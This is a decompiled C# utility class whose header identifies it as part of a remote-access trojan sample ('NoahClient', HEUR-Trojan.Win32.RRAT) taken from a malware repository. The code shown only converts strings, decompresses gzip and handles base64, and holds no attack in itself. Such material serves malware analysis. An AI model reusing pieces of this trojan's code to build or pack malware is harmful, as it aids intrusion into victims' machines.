// Decompiled with JetBrains decompiler
// Type: StringConverter
// Assembly: NoahClient, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A55B7EB4-612C-4348-ADA6-5D647EA578AF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.RRAT.gen-3378488a2930d73c433e9bbedbeb9065753dd5e236552aa80dd553a7e73ce693.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Text;

public static class StringConverter
{
  public static byte[] StringToBytes(string s) => Encoding.Default.GetBytes(s);

  public static string BytestoString(byte[] b) => Encoding.Default.GetString(b);

  public static byte[] Decompress(byte[] data)
  {
    try
    {
      MemoryStream memoryStream1 = new MemoryStream();
      memoryStream1.Write(data, 0, data.Length);
      memoryStream1.Position = 0L;
      GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
      MemoryStream memoryStream2 = new MemoryStream();
      byte[] buffer = new byte[64];
      for (int count = gzipStream.Read(buffer, 0, buffer.Length); count > 0; count = gzipStream.Read(buffer, 0, buffer.Length))
        memoryStream2.Write(buffer, 0, count);
      gzipStream.Close();
      return memoryStream2.ToArray();
    }
    catch
    {
      return (byte[]) null;
    }
  }

  public static string Encode(string str) => Convert.ToBase64String(Encoding.UTF8.GetBytes(str));

  public static string Decode(string str) => Encoding.UTF8.GetString(Convert.FromBase64String(str));
}
